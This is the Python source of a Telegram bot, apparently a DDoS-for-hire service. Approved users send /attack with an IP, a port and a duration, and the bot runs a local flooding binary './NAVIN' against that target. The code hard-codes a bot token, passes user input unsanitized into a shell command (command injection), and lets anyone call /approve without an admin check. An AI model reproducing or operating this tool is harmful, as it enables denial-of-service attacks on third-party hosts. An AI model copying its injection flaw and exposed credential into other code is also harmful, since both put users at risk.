import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '7548871019:AAHwFWLMgq8D2rwtYf6Y5CGYtwlILQiS1G0'
approved_users = set()

# Store attacked IPs to prevent duplicate attacks
attacked_ips = set()

# Define a set of admin user IDs
admin_users = {6236477871}  # Replace with actual admin user IDs

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    user_id = int(context.args[0])
    approved_users.add(user_id)
    await update.message.reply_text(f"User  {user_id} has been approved.")

async def admin_approve(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in admin_users:
        await update.message.reply_text("❌ You are not authorized to approve users.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Usage: /admin_approve <user_id>")
        return

    user_to_approve = int(context.args[0])
    approved_users.add(user_to_approve)
    await update.message.reply_text(f"Admin approved user {user_to_approve}.")

async def disapprove(update: Update, context: CallbackContext):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /disapprove <user_id>")
        return
    user_id = int(context.args[0])
    approved_users.discard(user_id)
    await update.message.reply_text(f"User  {user_id} has been disapproved.")

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./NAVIN {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  

    if user_id not in approved_users:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    if ip in attacked_ips:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ This IP ({ip}) has already been attacked!*\n*Try another target.*", parse_mode='Markdown')
        return

    attacked_ips.add(ip)

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("disapprove", disapprove))
    application.add_handler(CommandHandler("admin_approve", admin_approve))  # New admin command
    
    application.run_polling()

if __name__ == '__main__':
    main()